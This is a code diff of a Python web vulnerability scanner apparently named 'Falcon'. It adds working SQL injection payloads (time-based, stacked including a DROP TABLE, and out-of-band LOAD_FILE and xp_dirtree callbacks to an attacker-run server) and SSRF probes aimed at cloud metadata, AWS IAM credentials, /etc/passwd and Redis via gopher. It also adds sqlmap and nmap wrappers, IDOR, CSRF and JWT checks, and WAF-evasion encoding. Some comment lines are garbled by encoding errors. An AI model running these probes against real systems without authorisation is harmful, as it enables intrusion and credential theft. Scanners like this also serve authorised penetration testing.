+                if not right_has_error or (right_has_error != wrong_has_error):
+                    findings.append({
+                        "vuln_class": "sqli",
+                        "subtype": "union_based",
+                        "severity": "critical",
+                        "url": test_url,
+                        "injected_url": test_url,
+                        "param": param,
+                        "payload": payload,
+                        "columns": cols,
+                        "evidence": body[:300],
+                        "confidence": 0.85,
+                    })
+                    log.info("sqli_union_found", param=param, columns=cols)
+                    break
+    return findings
+
+
+async def test_sqli_boolean(pool, endpoint, params):
+    """Boolean-blind SQLi detection (differential response)."""
+    from urllib.parse import quote
+    findings = []
+    if not params:
+        return findings
+    TRUE_PAYLOADS = ["1' AND '1'='1", "1 AND 1=1", "1' OR 'a'='a"]
+    FALSE_PAYLOADS = ["1' AND '1'='2", "1 AND 1=2", "1' OR 'a'='b"]
+    for param in params:
+        # Baseline
+        try:
+            base = await pool.send("GET", endpoint + "?" + param + "=1")
+        except Exception:
+            continue
+        if not base or base.status == 0:
+            continue
+        base_len = len(base.text or "")
+        base_status = base.status
+        # Test each pair
+        for tp, fp in zip(TRUE_PAYLOADS, FALSE_PAYLOADS):
+            try:
+                t_url = endpoint + "?" + param + "=" + quote(tp, safe="")
+                f_url = endpoint + "?" + param + "=" + quote(fp, safe="")
+                t_resp = await pool.send("GET", t_url)
+                f_resp = await pool.send("GET", f_url)
+            except Exception:
+                continue
+            if not t_resp or not f_resp:
+                continue
+            t_len = len(t_resp.text or "")
+            f_len = len(f_resp.text or "")
+            t_status = t_resp.status
+            f_status = f_resp.status
+            # Significant difference indicates boolean-blind
+            len_diff = abs(t_len - f_len)
+            status_diff = (t_status != f_status)
+            # Threshold: 10% difference or status change
+            if len_diff > max(20, base_len * 0.1) or status_diff:
+                findings.append({
+                    "vuln_class": "sqli",
+                    "subtype": "boolean_blind",
+                    "severity": "high",
+                    "url": t_url,
+                    "injected_url": t_url,
+                    "param": param,
+                    "payload": tp + " vs " + fp,
+                    "evidence": "TRUE len=" + str(t_len) + ", FALSE len=" + str(f_len) + ", baseline=" + str(base_len),
+                    "confidence": 0.7,
+                })
+                log.info("sqli_boolean_found", param=param, diff=len_diff)
+                break
+    return findings
+
+
+async def test_sqli_stacked(pool, endpoint, params):
+    """Stacked queries detection (SQLi via ;)."""
+    from urllib.parse import quote
+    findings = []
+    if not params:
+        return findings
+    STACKED_PAYLOADS = [
+        "1; SELECT SLEEP(3)-- -",
+        "1'; SELECT pg_sleep(3)-- -",
+        "1; WAITFOR DELAY '0:0:3'-- -",
+        "1'; DROP TABLE nonexistent_xyz-- -",
+    ]
+    import time as _time
+    for param in params:
+        for payload in STACKED_PAYLOADS:
+            try:
+                t0 = _time.monotonic()
+                test_url = endpoint + "?" + param + "=" + quote(payload, safe="")
+                resp = await pool.send("GET", test_url)
+                elapsed = _time.monotonic() - t0
+            except Exception:
+                continue
+            if not resp or resp.status == 0:
+                continue
+            # Detect delay for sleep-based
+            if "SLEEP" in payload or "sleep" in payload or "WAITFOR" in payload:
+                if elapsed >= 2.5:
+                    findings.append({
+                        "vuln_class": "sqli",
+                        "subtype": "stacked_time_based",
+                        "severity": "critical",
+                        "url": test_url,
+                        "injected_url": test_url,
+                        "param": param,
+                        "payload": payload,
+                        "evidence": "Delayed " + str(round(elapsed, 2)) + "s",
+                        "confidence": 0.8,
+                    })
+                    log.info("sqli_stacked_found", param=param, delay=elapsed)
+                    break
+    return findings
+
+
+async def run_sqli_advanced(pool, endpoint, params):
+    """Run all advanced SQLi tests."""
+    all_findings = []
+    try:
+        union_f = await test_sqli_union(pool, endpoint, params)
+        all_findings.extend(union_f)
+    except Exception as _e:
+        log.debug("sqli_union_error", error=str(_e))
+    try:
+        bool_f = await test_sqli_boolean(pool, endpoint, params)
+        all_findings.extend(bool_f)
+    except Exception as _e:
+        log.debug("sqli_boolean_error", error=str(_e))
+    try:
+        stacked_f = await test_sqli_stacked(pool, endpoint, params)
+        all_findings.extend(stacked_f)
+    except Exception as _e:
+        log.debug("sqli_stacked_error", error=str(_e))
+    log.info("sqli_advanced_complete", findings=len(all_findings))
+    return all_findings
+
+
+async def test_sqli_time_advanced(pool, endpoint, params, oast=None):
+    """Advanced time-based SQLi: sub-second + OAST.
+
+    Uses precise timing and a baseline to reduce false positives.
+    """
+    from urllib.parse import quote
+    import time as _time
+    findings = []
+    if not params:
+        return findings
+
+    # 2s, 4s, 6s delays
+    DELAY_PAYLOADS = [
+        ("1' AND SLEEP(2)-- -", 2),
+        ("1' AND SLEEP(4)-- -", 4),
+        ("1' AND PG_SLEEP(2)-- -", 2),
+        ("1; WAITFOR DELAY '0:0:2'-- -", 2),
+        ("1' AND (SELECT 1 FROM (SELECT SLEEP(2))a)-- -", 2),
+    ]
+
+    for param in params:
+        # Baseline (average of 2 requests)
+        times = []
+        try:
+            for _ in range(2):
+                t0 = _time.monotonic()
+                await pool.send("GET", endpoint + "?" + param + "=1")
+                times.append(_time.monotonic() - t0)
+            baseline = sum(times) / len(times) if times else 1.0
+        except Exception:
+            continue
+
+        for payload, expected in DELAY_PAYLOADS:
+            try:
+                test_url = endpoint + "?" + param + "=" + quote(payload, safe="")
+                t0 = _time.monotonic()
+                resp = await pool.send("GET", test_url)
+                elapsed = _time.monotonic() - t0
+            except Exception:
+                continue
+            if not resp or resp.status == 0:
+                continue
+            # Threshold: at least 1.5s beyond baseline
+            if elapsed >= baseline + max(1.5, expected * 0.7):
+                # Verify with second request
+                try:
+                    t1 = _time.monotonic()
+                    await pool.send("GET", test_url)
+                    elapsed2 = _time.monotonic() - t1
+                except Exception:
+                    elapsed2 = 0
+                if elapsed2 >= baseline + max(1.5, expected * 0.7):
+                    findings.append({
+                        "vuln_class": "sqli",
+                        "subtype": "time_based_advanced",
+                        "severity": "critical",
+                        "url": test_url,
+                        "injected_url": test_url,
+                        "param": param,
+                        "payload": payload,
+                        "evidence": "delay: " + str(round(elapsed, 2)) + "s + " + str(round(elapsed2, 2)) + "s, baseline: " + str(round(baseline, 2)) + "s",
+                        "confidence": 0.9,
+                    })
+                    log.info("sqli_time_advanced_found", param=param, delay=elapsed)
+                    break
+    # OAST-based (out-of-band)
+    if oast:
+        try:
+            payload_url = oast.get_payload_url()
+            for param in params[:3]:
+                oast_payloads = [
+                    "1' AND LOAD_FILE('" + payload_url + "')-- -",
+                    "1' UNION SELECT '" + payload_url + "'-- -",
+                ]
+                for payload in oast_payloads:
+                    try:
+                        test_url = endpoint + "?" + param + "=" + quote(payload, safe="")
+                        await pool.send("GET", test_url)
+                    except Exception:
+                        continue
+            # Wait briefly for callbacks
+            import asyncio as _a
+            for _ in range(4):
+                await _a.sleep(0.5)
+                if oast.callbacks:
+                    break
+            if oast.callbacks:
+                findings.append({
+                    "vuln_class": "sqli",
+                    "subtype": "oast_blind",
+                    "severity": "critical",
+                    "url": endpoint,
+                    "injected_url": endpoint,
+                    "param": params[0] if params else "",
+                    "payload": "OAST callback",
+                    "evidence": "OAST received " + str(len(oast.callbacks)) + " callbacks",
+                    "confidence": 0.95,
+                })
+                log.info("sqli_oast_found", callbacks=len(oast.callbacks))
+        except Exception as _e:
+            log.debug("sqli_oast_error", error=str(_e))
+    log.info("sqli_time_advanced_complete", findings=len(findings))
+    return findings
+
+
+async def test_sqli_oast(pool, endpoint, params, oast):
+    """SQLi via OAST - blind detection through callbacks."""
+    from urllib.parse import quote
+    import asyncio as _a
+    findings = []
+    if not oast or not params:
+        return findings
+    payload_url = oast.get_payload_url()
+    PAYLOADS = []
+    PAYLOADS.append("1" + chr(39) + " AND LOAD_FILE(" + chr(39) + payload_url + chr(39) + ")-- -")
+    PAYLOADS.append("1" + chr(39) + " UNION SELECT LOAD_FILE(" + chr(39) + payload_url + chr(39) + ")-- -")
+    PAYLOADS.append("1; EXEC master..xp_dirtree " + chr(39) + payload_url + chr(39) + "-- -")
+    for param in params:
+        for payload in PAYLOADS:
+            try:
+                test_url = endpoint + "?" + param + "=" + quote(payload, safe="")
+                await pool.send("GET", test_url)
+            except Exception:
+                continue
+    for _ in range(8):
+        await _a.sleep(0.5)
+        if oast.callbacks:
+            break
+    if oast.callbacks:
+        findings.append({
+            "vuln_class": "sqli",
+            "subtype": "oast_blind",
+            "severity": "critical",
+            "url": endpoint,
+            "injected_url": endpoint,
+            "param": params[0] if params else "",
+            "payload": "OAST callback",
+            "evidence": "OAST received " + str(len(oast.callbacks)) + " callbacks",
+            "confidence": 0.95,
+        })
+        log.info("sqli_oast_confirmed", callbacks=len(oast.callbacks))
+    return findings
+
+
+async def test_ssrf_oast_advanced(pool, endpoint, params, oast):
+    """Advanced SSRF via OAST."""
+    from urllib.parse import quote
+    import asyncio as _a
+    findings = []
+    if not oast or not params:
+        return findings
+    payload_url = oast.get_payload_url()
+    PAYLOADS = [
+        payload_url,
+        payload_url.replace("http://", "http://127.0.0.1@"),
+    ]
+    for param in params:
+        for payload in PAYLOADS:
+            try:
+                test_url = endpoint + "?" + param + "=" + quote(payload, safe="")
+                await pool.send("GET", test_url)
+            except Exception:
+                continue
+    for _ in range(8):
+        await _a.sleep(0.5)
+        if oast.callbacks:
+            break
+    if oast.callbacks:
+        findings.append({
+            "vuln_class": "ssrf",
+            "subtype": "oast_ssrf",
+            "severity": "critical",
+            "url": endpoint,
+            "injected_url": endpoint,
+            "param": params[0] if params else "",
+            "payload": payload_url,
+            "evidence": "OAST received " + str(len(oast.callbacks)) + " callbacks",
+            "confidence": 0.95,
+        })
+        log.info("ssrf_oast_confirmed", callbacks=len(oast.callbacks))
+    return findings
+
+async def test_sqlmap_bridge(pool, endpoint, params=None):
+    """SQLMap bridge - call sqlmap via subprocess for deep extraction."""
+    import subprocess
+    import asyncio
+    import shutil as _sh
+    import tempfile as _tmp
+    findings = []
+    # Check if sqlmap is installed
+    sqlmap_path = _sh.which("sqlmap")
+    if not sqlmap_path:
+        log.debug("sqlmap_not_installed")
+        return findings
+    if params is None:
+        params = ["id", "q", "search"]
+    if not params:
+        return findings
+    # Prepare output dir
+    try:
+        out_dir = _tmp.mkdtemp(prefix="sqlmap_")
+    except Exception:
+        return findings
+    for param in params[:3]:
+        try:
+            test_url = endpoint + ("&" if "?" in endpoint else "?") + param + "=1"
+            cmd = [
+                sqlmap_path,
+                "-u", test_url,
+                "--batch",
+                "--level=2",
+                "--risk=1",
+                "--timeout=10",
+                "--retries=1",
+                "--output-dir=" + out_dir,
+                "--flush-session",
+                "--answers=redirect=N,detectWaf=N",
+            ]
+            proc = await asyncio.create_subprocess_exec(
+                *cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+            )
+            try:
+                stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=60)
+            except asyncio.TimeoutError:
+                proc.kill()
+                continue
+            output = (stdout or b"").decode("utf-8", errors="ignore")
+            if "is vulnerable" in output.lower() or "injectable" in output.lower():
+                findings.append({
+                    "vuln_class": "sqli",
+                    "subtype": "sqlmap_confirmed",
+                    "severity": "critical",
+                    "url": test_url,
+                    "injected_url": test_url,
+                    "param": param,
+                    "payload": "(sqlmap)",
+                    "evidence": output[:500],
+                    "confidence": 0.95,
+                })
+                log.info("sqlmap_confirmed", param=param)
+        except Exception as _e:
+            log.debug("sqlmap_error", error=str(_e))
+            continue
+    log.info("sqlmap_bridge_complete", findings=len(findings))
+    return findings
+
+async def test_nmap_scan(pool, target):
+    """Nmap port scan via subprocess."""
+    import subprocess
+    import asyncio
+    import shutil as _sh
+    import re as _re
+    findings = []
+    nmap_path = _sh.which("nmap")
+    if not nmap_path:
+        log.debug("nmap_not_installed")
+        return findings
+    # Extract hostname
+    from urllib.parse import urlparse
+    parsed = urlparse(target)
+    host = parsed.hostname
+    if not host:
+        return findings
+    try:
+        cmd = [
+            nmap_path,
+            "-T4",
+            "--top-ports", "100",
+            "-sV",
+            "--max-retries", "1",
+            "--host-timeout", "30s",
+            host,
+        ]
+        proc = await asyncio.create_subprocess_exec(
+            *cmd,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE,
+        )
+        try:
+            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=45)
+        except asyncio.TimeoutError:
+            proc.kill()
+            return findings
+        output = (stdout or b"").decode("utf-8", errors="ignore")
+        # Parse open ports
+        for line in output.splitlines():
+            m = _re.match(r"(\d+)/tcp\s+open\s+(\S+)\s*(.*)", line)
+            if m:
+                port = int(m.group(1))
+                service = m.group(2)
+                version = m.group(3).strip()[:100]
+                sev = 'info'
+                if port in (22, 23, 3389, 5900, 3306, 5432, 6379, 27017):
+                    sev = 'medium'
+                findings.append({
+                    "vuln_class": "port_scan",
+                    "subtype": "open_port",
+                    "severity": sev,
+                    "url": target,
+                    "injected_url": target,
+                    "param": str(port),
+                    "payload": "",
+                    "evidence": "Port " + str(port) + "/tcp open " + service + " " + version,
+                    "confidence": 0.95,
+                })
+        log.info("nmap_complete", open_ports=len(findings))
+    except Exception as _e:
+        log.debug("nmap_error", error=str(_e))
+    return findings
 
 async def test_sqli(pool, endpoint, params):
     """Test for SQL injection (error-based + time-based)."""
@@ -825,6 +2804,83 @@ async def test_open_redirect(pool, endpoint, params):
                     break
     return findings
 
+
+async def test_ssrf_advanced(pool, endpoint, params=None):
+    """Advanced SSRF: cloud metadata + DNS rebinding + protocol smuggling."""
+    from urllib.parse import quote
+    if params is None:
+        params = ["url", "next", "redirect", "target", "callback", "webhook"]
+    findings = []
+    # Cloud metadata endpoints
+    METADATA = [
+        ("AWS", "http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id", "iam"]),
+        ("AWS_IAM", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", ["AccessKeyId", "SecretAccessKey"]),
+        ("GCP", "http://metadata.google.internal/computeMetadata/v1/", ["project", "instance"]),
+        ("Azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", ["vmId", "location"]),
+        ("DigitalOcean", "http://169.254.169.254/metadata/v1/", ["droplet_id", "region"]),
+        ("Alibaba", "http://100.100.100.200/latest/meta-data/", ["instance-id", "region"]),
+    ]
+    # Local services
+    LOCAL = [
+        ("localhost", "http://127.0.0.1:80/"),
+        ("localhost_8080", "http://127.0.0.1:8080/"),
+        ("localhost_22", "http://127.0.0.1:22/"),
+        ("file", "file:///etc/passwd"),
+        ("gopher", "gopher://127.0.0.1:6379/_INFO"),
+    ]
+    for param in params:
+        # Test metadata
+        for cloud, url, indicators in METADATA:
+            try:
+                test_url = endpoint + "?" + param + "=" + quote(url, safe="")
+                resp = await pool.send("GET", test_url)
+            except Exception:
+                continue
+            if not resp or resp.status == 0:
+                continue
+            body = (resp.text or "")
+            if any(ind in body for ind in indicators):
+                findings.append({
+                    "vuln_class": "ssrf",
+                    "subtype": "cloud_metadata_" + cloud.lower(),
+                    "severity": "critical",
+                    "url": test_url,
+                    "injected_url": test_url,
+                    "param": param,
+                    "payload": url,
+                    "evidence": body[:300],
+                    "confidence": 0.95,
+                })
+                log.info("ssrf_metadata_found", cloud=cloud, param=param)
+                break
+        # Test local services
+        for svc, url in LOCAL:
+            try:
+                test_url = endpoint + "?" + param + "=" + quote(url, safe="")
+                resp = await pool.send("GET", test_url)
+            except Exception:
+                continue
+            if not resp or resp.status == 0:
+                continue
+            body_low = (resp.text or "").lower()
+            indicators = ["root:x:", "redis_version", "ssh-", "server:",
+                          "openresty", "nginx", "apache"]
+            if any(i in body_low for i in indicators):
+                findings.append({
+                    "vuln_class": "ssrf",
+                    "subtype": "local_service_" + svc,
+                    "severity": "high",
+                    "url": test_url,
+                    "injected_url": test_url,
+                    "param": param,
+                    "payload": url,
+                    "evidence": body_low[:300],
+                    "confidence": 0.85,
+                })
+                log.info("ssrf_local_found", svc=svc, param=param)
+                break
+    log.info("ssrf_advanced_complete", findings=len(findings))
+    return findings
 
 async def test_ssrf(pool, endpoint, params):
     """Test for SSRF via parameter manipulation."""
@@ -946,7 +3002,7 @@ import socket
 import threading
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
-# ── Bypass Plane ─────────────────────────────────────────────
+# â”€â”€ Bypass Plane â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
 class BypassPlane:
     """Payload encoding chains to evade WAFs and filters."""
@@ -1008,7 +3064,7 @@ class BypassPlane:
         return list(dict.fromkeys(variants))[:6]
 
 
-# ── OAST Server ──────────────────────────────────────────────
+# â”€â”€ OAST Server â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
 class OASTHandler(BaseHTTPRequestHandler):
     """HTTP handler for OAST callbacks."""
@@ -1079,7 +3135,7 @@ class OASTServer:
         return list(self.callbacks)
 
 
-# ── Database ─────────────────────────────────────────────────
+# â”€â”€ Database â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
 class FalconDB:
     """SQLite database for scan results."""
@@ -1209,7 +3265,7 @@ class FalconDB:
         }
 
 
-# ── Blind Tests (via OAST) ───────────────────────────────────
+# â”€â”€ Blind Tests (via OAST) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
 async def test_blind_xss(pool, endpoint, params, oast: OASTServer):
     """Test for blind XSS - injects script that calls back to OAST."""
@@ -1275,7 +3331,7 @@ async def test_ssrf_oast(pool, endpoint, params, oast: OASTServer):
     return findings
 
 
-# ── Stage 4 Integration into run_scan ────────────────────────
+# â”€â”€ Stage 4 Integration into run_scan â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
 async def run_scan_v4(target, budget=100, exploit="off"):
     """Full scan with OAST + DB + Bypass."""
@@ -1367,495 +3423,228 @@ import socket
 import threading
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
-# ── Bypass Plane ─────────────────────────────────────────────
+# â”€â”€ Bypass Plane â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
-class BypassPlane:
-    """Payload encoding chains to evade WAFs and filters."""
-
-    @staticmethod
-    def url_encode(payload):
-        from urllib.parse import quote
-        return quote(payload, safe="")
-
-    @staticmethod
-    def double_url_encode(payload):
-        from urllib.parse import quote
-        return quote(quote(payload, safe=""), safe="")
-
-    @staticmethod
-    def html_entity(payload):
-        return "".join(f"&#{ord(c)};" for c in payload)
-
-    @staticmethod
-    def unicode_escape(payload):
-        return "".join(f"\\u{ord(c):04x}" for c in payload)
-
-    @staticmethod
-    def mixed_case(payload):
-        result = []
-        for i, c in enumerate(payload):
-            result.append(c.upper() if i % 2 == 0 else c.lower())
-        return "".join(result)
-
-    @staticmethod
-    def sql_comment(payload):
-        return payload.replace(" ", "/**/")
-
-    @staticmethod
-    def null_byte(payload):
-        return payload + "%00"
-
-    @classmethod
-    def chains(cls, payload, vuln_class="xss"):
-        """Generate encoding variants based on vuln class."""
-        variants = [payload]
-        if vuln_class == "xss":
-            variants.extend([
-                cls.url_encode(payload),
-                cls.html_entity(payload),
-                cls.mixed_case(payload),
-            ])
-        elif vuln_class == "sqli":
-            variants.extend([
-                cls.sql_comment(payload),
-                cls.mixed_case(payload),
-                cls.url_encode(payload),
-            ])
-        elif vuln_class == "ssrf":
-            variants.extend([
-                cls.url_encode(payload),
-                cls.double_url_encode(payload),
-            ])
-        return list(dict.fromkeys(variants))[:6]
+# IDOR_IMPROVED_ABC
+async def test_idor(pool, endpoints, session_a=None, session_b=None):
+    """Test for IDOR - access resources with different IDs."""
+    findings = []
+    id_pattern = __import__("re").compile(r"[?&](id|user_id|account|uid|pid)=([0-9]+)")
+    
+    for endpoint in endpoints:
+        match = id_pattern.search(endpoint)
+        if not match:
+            continue
+        param = match.group(1)
+        original_id = int(match.group(2))
+        # Test adjacent IDs
+        for test_id in [original_id + 1, original_id - 1, original_id + 1000, 1]:
+            if test_id < 1:
+                continue
+            test_url = id_pattern.sub(f"{param}={test_id}", endpoint)
+            resp = await pool.send("GET", test_url)
+            if resp.status == 200 and len(resp.text) > 100:
+                # Potential IDOR - check if content differs meaningfully
+                findings.append({
+                    "vuln_class": "idor",
+                    "subtype": "sequential_id",
+                    "severity": "high",
+                    "url": test_url,
+                    "param": param,
+                    "payload": str(test_id),
+                    "evidence": f"Accessed resource with {param}={test_id} (status=200, len={len(resp.text)})",
+                    "confidence": 0.6,
+                })
+                log.info("idor_candidate", url=test_url, param=param, test_id=test_id)
+                break
+    return findings
 
 
-# ── OAST Server ──────────────────────────────────────────────
+async def test_csrf_advanced(pool, target):
+    """Advanced CSRF: SameSite + token bypass."""
+    import re as _re
+    findings = []
+    resp = await pool.send("GET", target)
+    if not resp or resp.status == 0:
+        return findings
+    hdrs = {k.lower(): (v or "") for k, v in (resp.headers or {}).items()}
+    set_cookie = hdrs.get("set-cookie", "").lower()
+    has_samesite = "samesite" in set_cookie
+    if not has_samesite:
+        findings.append({
+            "vuln_class": "csrf",
+            "subtype": "no_samesite_cookie",
+            "severity": "medium",
+            "url": target,
+            "injected_url": target,
+            "param": "Set-Cookie",
+            "payload": "",
+            "evidence": "No SameSite cookie attribute detected",
+            "confidence": 0.7,
+        })
+    body = resp.text or ""
+    forms = _re.findall(r"<form[^>]*>(.*?)</form>", body, _re.IGNORECASE | _re.DOTALL)
+    TOKEN_HINTS = ["csrf", "xsrf", "_token", "authenticity_token", "nonce", "requestverificationtoken"]
+    for i, form_body in enumerate(forms[:10]):
+        form_lower = form_body.lower()
+        has_token = any(h in form_lower for h in TOKEN_HINTS)
+        is_state_changing = any(x in form_lower for x in ["password", "email", "username", "delete", "update", "profile"])
+        if is_state_changing and not has_token:
+            findings.append({
+                "vuln_class": "csrf",
+                "subtype": "missing_token",
+                "severity": "medium",
+                "url": target,
+                "injected_url": target,
+                "param": "form_" + str(i + 1),
+                "payload": "",
+                "evidence": "Form " + str(i + 1) + " missing CSRF token",
+                "confidence": 0.7,
+            })
+    log.info("csrf_advanced_complete", findings=len(findings))
+    return findings
 
-class OASTHandler(BaseHTTPRequestHandler):
-    """HTTP handler for OAST callbacks."""
-    server_instance = None
-    def log_message(self, *args):
-        pass
-    def do_GET(self):
-        if OASTHandler.server_instance:
-            OASTHandler.server_instance.record_callback(
-                "http",
-                self.client_address[0],
-                self.path,
-            )
-        self.send_response(200)
-        self.send_header("Content-Type", "text/plain")
-        self.end_headers()
-        self.wfile.write(b"OK")
-    do_POST = do_GET
+async def test_csrf(pool, forms):
+    """Test for CSRF - check for missing CSRF tokens in forms."""
+    findings = []
+    for form in forms:
+        action = form.get("action", "")
+        if not action:
+            continue
+        resp = await pool.send("GET", action)
+        if resp.status == 0:
+            continue
+        body = resp.text.lower()
+        # Check for CSRF token indicators
+        csrf_indicators = ["csrf", "xsrf", "_token", "authenticity_token", "nonce"]
+        has_csrf = any(ind in body for ind in csrf_indicators)
+        if not has_csrf:
+            # Check for state-changing form
+            has_password = "password" in body.lower()
+            has_post = "post" in body.lower()
+            if has_password or has_post:
+                findings.append({
+                    "vuln_class": "csrf",
+                    "subtype": "missing_token",
+                    "severity": "medium",
+                    "url": action,
+                    "param": "",
+                    "payload": "Cross-site form submission",
+                    "evidence": f"Form at {action} has no CSRF token",
+                    "confidence": 0.5,
+                })
+                log.info("csrf_candidate", action=action)
+    return findings
 
 
-class OASTServer:
-    """Simple HTTP callback server for blind vuln detection."""
-    def __init__(self, host="0.0.0.0", port=9999, public_domain="oast.local"):
-        self.host = host
-        self.port = port
-        self.public_domain = public_domain
-        self.callbacks = []
-        self._server = None
-        self._thread = None
-        self._token = None
-
-    def start(self):
+async def test_jwt_multi(pool, target):
+    """JWT multi-vector: jku, x5u, x5c, kid injection, alg confusion."""
+    import re as _re
+    import base64 as _b64
+    import json as _json
+    findings = []
+    resp = await pool.send("GET", target)
+    if not resp or resp.status == 0:
+        return findings
+    body = resp.text or ""
+    jwt_re = _re.compile(r"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")
+    tokens = jwt_re.findall(body)[:5]
+    for token in tokens:
+        parts = token.split(".")
+        if len(parts) != 3:
+            continue
         try:
-            OASTHandler.server_instance = self
-            self._server = HTTPServer((self.host, self.port), OASTHandler)
-            self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
-            self._thread.start()
-            log.info("oast_started", host=self.host, port=self.port)
-            return True
-        except Exception as exc:
-            log.warning("oast_start_failed", error=str(exc))
-            return False
-
-    def stop(self):
-        if self._server:
-            self._server.shutdown()
-            self._server = None
-
-    def record_callback(self, cb_type, source_ip, path):
-        self.callbacks.append({
-            "type": cb_type,
-            "ip": source_ip,
-            "path": path,
-            "timestamp": time.time(),
-        })
-        log.info("oast_callback", type=cb_type, ip=source_ip, path=path)
-
-    def new_token(self):
-        self._token = f"falcon-{int(time.time())}"
-        return self._token
-
-    def get_payload_url(self):
-        token = self.new_token()
-        return f"http://{self.public_domain}:{self.port}/{token}"
-
-    def poll(self, timeout=8):
-        time.sleep(timeout)
-        return list(self.callbacks)
-
-
-# ── Database ─────────────────────────────────────────────────
-
-class FalconDB:
-    """SQLite database for scan results."""
-    def __init__(self, db_path="falcon.db"):
-        self.db_path = db_path
-        self._init_db()
-
-    def _init_db(self):
-        conn = sqlite3.connect(self.db_path)
-        cur = conn.cursor()
-        cur.execute("""
-            CREATE TABLE IF NOT EXISTS scans (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                target TEXT NOT NULL,
-                budget INTEGER,
-                exploit TEXT,
-                status TEXT,
-                findings_count INTEGER,
-                requests_used INTEGER,
-                elapsed_seconds REAL,
-                ai_tokens INTEGER,
-                ai_plan TEXT,
-                started_at REAL,
-                completed_at REAL
-            )
-        """)
-        cur.execute("""
-            CREATE TABLE IF NOT EXISTS findings (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                scan_id INTEGER,
-                vuln_class TEXT,
-                subtype TEXT,
-                severity TEXT,
-                url TEXT,
-                param TEXT,
-                payload TEXT,
-                evidence TEXT,
-                confidence REAL,
-                created_at REAL
-            )
-        """)
-        conn.commit()
-        conn.close()
-
-    def save_scan(self, summary, findings):
-        conn = sqlite3.connect(self.db_path)
-        cur = conn.cursor()
-        ai_plan_data = summary.get("ai_plan", {}) or {}
-        if isinstance(ai_plan_data, dict):
-            if summary.get("waf"):
-                ai_plan_data["_waf"] = summary.get("waf")
-            if summary.get("hidden_paths"):
-                ai_plan_data["_hidden_paths"] = summary.get("hidden_paths")
-            if summary.get("waf_info"):
-                ai_plan_data["_waf_info"] = summary.get("waf_info")
-        ai_plan_json = json.dumps(ai_plan_data, ensure_ascii=False) if ai_plan_data else None
-        cur.execute("""
-            INSERT INTO scans (target, budget, exploit, status, findings_count,
-                requests_used, elapsed_seconds, ai_tokens, ai_plan, started_at, completed_at)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-        """, (
-            summary.get("target", ""),
-            summary.get("budget", 0),
-            summary.get("exploit", "off"),
-            summary.get("status", "unknown"),
-            len(findings),
-            summary.get("budget_used", 0),
-            summary.get("elapsed_seconds", 0),
-            summary.get("ai_tokens", 0),
-            ai_plan_json,
-            time.time() - summary.get("elapsed_seconds", 0),
-            time.time(),
-        ))
-        scan_id = cur.lastrowid
-        for f in findings:
-            cur.execute("""
-                INSERT INTO findings (scan_id, vuln_class, subtype, severity, url,
-                    param, payload, evidence, confidence, created_at)
-                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-            """, (
-                scan_id,
-                f.get("vuln_class", ""),
-                f.get("subtype", ""),
-                f.get("severity", "info"),
-                f.get("url", ""),
-                f.get("param", ""),
-                f.get("payload", ""),
-                f.get("evidence", "")[:2000],
-                f.get("confidence", 0.0),
-                time.time(),
-            ))
-        conn.commit()
-        conn.close()
-        return scan_id
-
-    def list_scans(self, limit=50):
-        conn = sqlite3.connect(self.db_path)
-        conn.row_factory = sqlite3.Row
-        cur = conn.cursor()
-        cur.execute("SELECT * FROM scans ORDER BY id DESC LIMIT ?", (limit,))
-        rows = [dict(r) for r in cur.fetchall()]
-        conn.close()
-        return rows
-
-    def list_findings(self, limit=200):
-        conn = sqlite3.connect(self.db_path)
-        conn.row_factory = sqlite3.Row
-        cur = conn.cursor()
-        cur.execute("SELECT * FROM findings ORDER BY id DESC LIMIT ?", (limit,))
-        rows = [dict(r) for r in cur.fetchall()]
-        conn.close()
-        return rows
-
-    def stats(self):
-        conn = sqlite3.connect(self.db_path)
-        cur = conn.cursor()
-        scans = cur.execute("SELECT COUNT(*) FROM scans").fetchone()[0]
-        findings = cur.execute("SELECT COUNT(*) FROM findings").fetchone()[0]
-        by_sev = dict(cur.execute("SELECT severity, COUNT(*) FROM findings GROUP BY severity").fetchall())
-        by_class = dict(cur.execute("SELECT vuln_class, COUNT(*) FROM findings GROUP BY vuln_class").fetchall())
-        conn.close()
-        return {
-            "scans": scans,
-            "findings": findings,
-            "by_severity": by_sev,
